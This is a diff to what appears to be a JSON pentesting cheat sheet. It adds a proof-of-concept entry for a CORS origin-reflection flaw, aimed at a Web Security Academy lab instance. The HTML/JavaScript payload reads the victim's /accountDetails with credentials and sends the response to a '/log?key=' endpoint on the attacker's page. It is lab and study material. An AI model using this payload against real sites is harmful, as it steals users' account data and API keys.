@@ -34,6 +34,30 @@
         ]
     },
     {
+        "title": "1. CORS VULNERABILITY WITH BASIC ORIGIN REFLECTION",
+        "subtitle": "POC for CORS vulnerability with basic origin reflection <br> -generate poc with https://guptashubham.com/resources/cors-poc-generator/",
+        "commands": [
+            "&lt;html&gt;",
+            "&lt;body&gt;",
+            "  &lt;script&gt;",
+            "    var xhr = new XMLHttpRequest();",
+            "    var url = \"https://0a4000640477ce6d822230e700300072.web-security-academy.net\";",
+            "",
+            "    xhr.onreadystatechange = function () {",
+            "      if (xhr.readyState == XMLHttpRequest.DONE) {",
+            "        fetch(\"/log?key=\" + xhr.responseText);",
+            "      }",
+            "    };",
+            "",
+            "    xhr.open('GET', url + \"/accountDetails\", true);",
+            "    xhr.withCredentials = true;",
+            "    xhr.send(null);",
+            "  &lt;/script&gt;",
+            "&lt;/body&gt;",
+            "&lt;/html&gt;"
+        ]
+    },
+    {
         "title": "GREP SECRETS",
         "subtitle": "Grab secrets from jsfiles",
         "commands": [
